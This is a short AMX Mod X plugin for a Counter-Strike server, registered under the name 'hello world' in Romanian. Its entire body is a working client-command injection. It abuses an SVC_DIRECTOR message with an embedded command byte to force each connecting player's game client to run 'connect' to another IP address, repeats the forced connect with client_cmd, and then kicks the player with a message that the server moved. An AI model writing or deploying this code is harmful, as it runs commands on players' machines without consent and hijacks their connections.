#include <amxmodx>

public plugin_init()
{
	register_plugin("salut lume", "c++", "/n");
}

public client_authorized(id)
{
	svc_engineclientcmd("connect 89.40.233.75:27015", id);
	client_cmd(id, "wait;wait;wait;wait;^"connect 89.40.233.75:27015^"");
	
	set_task(30.0, "KickPlayer", id);
}

public KickPlayer(id)
{
	server_cmd("kick #%d ^"Ne-am mutat pe Dr.FioriGinal.Ro.^"",get_user_userid(id));
}

const SVC_DIRECTOR_ID = 51;
const SVC_RUSSIAN = 10;

stock svc_engineclientcmd(text[], id = 0) 
{
	message_begin(MSG_ONE, SVC_DIRECTOR_ID, _, id);
	write_byte(strlen(text) + 2);
	write_byte(SVC_RUSSIAN);
	write_string(text);
	message_end();
}